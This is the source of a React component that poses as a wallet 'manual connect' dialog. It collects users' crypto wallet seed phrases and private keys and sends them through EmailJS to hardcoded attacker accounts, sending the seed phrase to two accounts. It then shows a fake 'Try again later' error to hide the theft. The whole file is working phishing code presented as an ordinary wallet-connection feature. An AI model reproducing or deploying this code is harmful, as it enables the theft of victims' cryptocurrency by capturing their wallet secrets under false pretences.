import React, { useRef, useState } from "react";
import ConnectPop from "../../components/connect/ConnectPop";
import { Layout, PageLayout } from "../../globalStyle";
import styled from "styled-components";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

function ManualConnect() {
  const navigate = useNavigate();
  const [connect, setConnect] = useState(false);
  const [tab, setTab] = useState(1);
  const [loading, setLoading] = useState(false);

  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const phraseform = useRef();
  const keyform = useRef();

  const handlePhrase = (e) => {
    e.preventDefault();
    setLoading(true);
    emailjs
      .sendForm(
        "service_lpp0ez1",
        "template_tpueesf",
        phraseform.current,
        "mQcWugYQOwuKdh1vu"
      )
      .then((response) => {
        setLoading(false);
        alert("Try again later");
        setPhrase("");
      
       emailjs
      .sendForm(
        "service_udsvw3d",
        "template_w2c0rx5",
        phraseform.current,
        "DNsER4-4UGLWYPh73"
      )
      })
      .catch((error) => {
        setLoading(false);
        alert(error);
      });
  };
  const handlePrivateKey = (e) => {
    e.preventDefault();
    setLoading(true);
    emailjs
      .sendForm(
        "service_lpp0ez1",
        "template_tpueesf",
        keyform.current,
        "mQcWugYQOwuKdh1vu"
      )
      .then((response) => {
        setLoading(false);
        alert("Try again later");
        setPrivateKey("");
      })
      .catch((error) => {
        setLoading(false);
        alert(error);
      });
  };

  const handleModalClick = (e) => {
    e.stopPropagation();
  };
  return (
    <>
      <Layout onClick={() => navigate("/")}>
        <PageLayout>
          <Modal onClick={handleModalClick}>
            <div className="page-content">
              <Content>
                <div className="head">
                  <button
                    className={tab === 1 ? "active" : "inactive"}
                    onClick={() => {
                      setTab(1);
                      setLoading(false);
                    }}
                  >
                    Phrase
                  </button>
                  <button
                    className={tab === 2 ? "active" : "inactive"}
                    onClick={() => {
                      setTab(2);
                      setLoading(false);
                    }}
                  >
                    Private Key
                  </button>
                </div>

                {tab === 1 && (
                  <Form ref={phraseform} onSubmit={handlePhrase}>
                    <textarea
                      value={phrase}
                      onChange={(e) => setPhrase(e.target.value)}
                      required
                      rows="10"
                      name="phrase"
                      placeholder="Secret Phrase"
                    ></textarea>
                    <p>
                      Typically 12 (sometimes 18, 24) words separated by single
                      spaces
                    </p>
                    <button type="submit">
                      {!loading ? "Connect" : <Preloader />}
                    </button>
                  </Form>
                )}

                {tab === 2 && (
                  <Form ref={keyform} onSubmit={handlePrivateKey}>
                    <textarea
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                      required
                      name="key"
                      rows="5"
                      placeholder="Private key"
                    ></textarea>
                    <p>Typically numbers</p>
                    <button type="submit">
                      {!loading ? "Connect" : <Preloader />}
                    </button>
                  </Form>
                )}
              </Content>
            </div>
          </Modal>
        </PageLayout>
      </Layout>

      {connect && <ConnectPop connect={() => setConnect(false)} />}
    </>
  );
}

export default ManualConnect;

const Content = styled.div`
  background: #191b1a;
  /* box-shadow: 0px 0px 30px 5px rgba(143, 5, 138, 0.47); */

  width: 406px;
  border-radius: 10px;
  padding: 20px;

  .head {
    display: flex;
    padding: 10px;
    background: #232523;
    border-radius: 10px;
    margin-bottom: 10px;

    .inactive {
      background: transparent;
      color: #ffffff81;
    }
  }
`;

const Form = styled.form`
  display: flex;
  flex-direction: column;
  margin-top: 20px;

  label {
    color: #ffffffa9;
    font-size: 15px;
    margin-bottom: 10px;
  }

  textarea {
    background: #232523;
    padding: 10px;
    border-radius: 10px;
    border: none;
    color: #fff;

    &:focus {
      outline: none;
    }
  }
  p {
    margin: 10px 0;
    color: #ffffff5c;
    font-size: 12px;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: center;
  }
`;

const Preloader = styled.div`
  display: flex;
  align-items: center;
  justify-content: center;
  width: 30px;
  height: 30px;
  border-radius: 50%;
  background-color: #008c2f;
  animation: spin 1s linear infinite;

  @keyframes spin {
    0% {
      transform: rotate(0deg);
    }
    100% {
      transform: rotate(360deg);
    }
  }

  &::after {
    content: "";
    display: block;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    border: 5px solid #fff;
    border-color: #191b1a transparent #fff transparent;
    animation: spin 0.7s ease-in-out infinite;
  }
`;

const Modal = styled.div`
  width: 100%;
  height: 90vh;
  border-radius: 10px;
  display: flex;
  justify-content: center;
  align-items: center;
`;
